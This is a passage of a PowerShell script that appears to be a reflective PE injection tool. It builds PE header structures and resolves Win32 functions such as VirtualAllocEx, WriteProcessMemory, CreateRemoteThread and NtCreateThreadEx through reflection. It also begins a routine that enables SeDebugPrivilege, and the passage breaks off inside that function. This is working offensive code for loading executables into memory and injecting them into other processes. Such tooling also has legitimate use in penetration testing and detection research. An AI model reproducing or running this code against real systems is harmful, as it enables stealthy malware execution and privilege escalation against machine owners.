		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY

		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID

		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES

		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object

		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object

		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc

		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx

		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy

		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset

		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress

		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr

		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree

		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx

		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect

		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle

		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary

		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess

		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject

		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory

		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory

		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread

		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread

		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken

		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread

		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges

		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue

		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf

		# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }

		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process

		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread

		return $Win32Functions
	}
	#####################################


	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}


				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}

		return [BitConverter]::ToInt64($FinalBytes, 0)
	}


	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF

				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}

		return [BitConverter]::ToInt64($FinalBytes, 0)
	}


	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}

		return $false
	}


	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)

		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }


	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,

		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)

	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))

		$PEEndAddress = $PEInfo.EndAddress

		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}


	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,

			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)

		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]

	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),

	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')

	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]

	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,

	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}


	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}

		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}

				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}

		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
